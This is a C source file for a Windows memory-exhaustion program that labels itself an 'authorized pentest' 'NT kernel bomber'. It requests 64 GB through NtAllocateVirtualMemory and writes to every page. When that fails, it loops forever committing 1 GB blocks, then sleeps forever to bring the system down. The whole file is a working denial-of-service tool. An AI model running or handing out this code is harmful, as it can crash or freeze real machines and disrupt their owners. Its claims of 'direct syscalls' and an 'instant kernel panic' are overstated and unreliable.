#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#pragma comment(lib, "ntdll.lib")

// NTSTATUS codes for direct syscalls
#define STATUS_SUCCESS 0x00000000L
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle, 
    PVOID *BaseAddress, 
    ULONG_PTR ZeroBits, 
    PSIZE_T RegionSize, 
    ULONG AllocationType, 
    ULONG Protect
);

int main() {
    printf("🔥 AUTHORIZED WINDOWS PENTEST - NT KERNEL BOMBER\n");
    printf("Target: SYSTEM CRASH via 64GB NT memory allocation\n");
    
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtAllocateVirtualMemory NtAllocate = 
        (pNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    
    // 64GB target - bypass Heap/VirtualAlloc limits
    SIZE_T size = 64ULL << 30;
    PVOID base = 0;
    
    printf("[+] Bypassing user-mode allocators → Direct NT syscall\n");
    printf("[+] Requesting 64GB contiguous @ NULL\n");
    
    NTSTATUS status = NtAllocate(GetCurrentProcess(), &base, 0, &size,
                                MEM_RESERVE | MEM_COMMIT | MEM_LARGE_PAGES,
                                PAGE_READWRITE);
    
    if (NT_SUCCESS(status)) {
        printf("[+] 64GB ALLOCATED - TOUCHING PAGES\n");
        
        // Commit EVERY page → instant kernel panic
        char* ptr = (char*)base;
        for (SIZE_T i = 0; i < size; i += 0x1000) {
            *(volatile char*)(ptr + i) = 0xDE;  // Force page-in
        }
        
        printf("[-] SYSTEM COLLAPSE IMMINENT\n");
    } else {
        printf("[-] NtAllocate failed (0x%lx) - falling back to VirtualAlloc\n", status);
        
        // Fallback: Massive VirtualAlloc chain
        while (1) {
            PVOID mem = VirtualAlloc(0, 1ULL<<30, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
            if (mem) {
                for (SIZE_T i = 0; i < 1ULL<<30; i += 0x1000) {
                    *(volatile char*)((char*)mem + i) = 0xAD;
                }
            }
        }
    }
    
    // No escape
    while(1) Sleep(INFINITE);
    return 0;
}
